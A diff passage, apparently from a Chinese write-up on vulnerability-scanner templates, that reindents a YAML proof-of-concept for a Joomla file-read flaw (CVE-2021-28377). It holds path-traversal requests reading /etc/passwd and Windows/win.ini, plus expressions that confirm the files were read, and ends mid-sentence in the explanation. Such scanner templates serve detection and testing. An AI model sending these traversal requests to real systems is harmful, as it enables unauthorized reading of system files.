@@ -7,23 +7,23 @@ name: poc-yaml-joomla-cve-2021-28377-fileread
 manual: true
 transport: http
 rules:
-	r0:
-		request:
-			cache: true
-			method: GET
-			path: /index.php?f=../../../../../../../etc/passwd
-		expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
-	r1:
-		request:
-			cache: true
-			method: GET
-			path: /index.php?f=../../../../../../../Windows/win.ini
-		expression: response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /index.php?f=../../../../../../../etc/passwd
+        expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /index.php?f=../../../../../../../Windows/win.ini
+        expression: response.status == 200 && response.body.bcontains(b"for 16-bit app support")
 expression: r0() || r1()
 detail:
-	author: Chaitin
-	links:
-		- http://example.com
+    author: Chaitin
+    links:
+        - http://example.com
 ```
 
 在这类漏洞中，必然至少有一个rule会去访问我们所需要读取的文件，那么
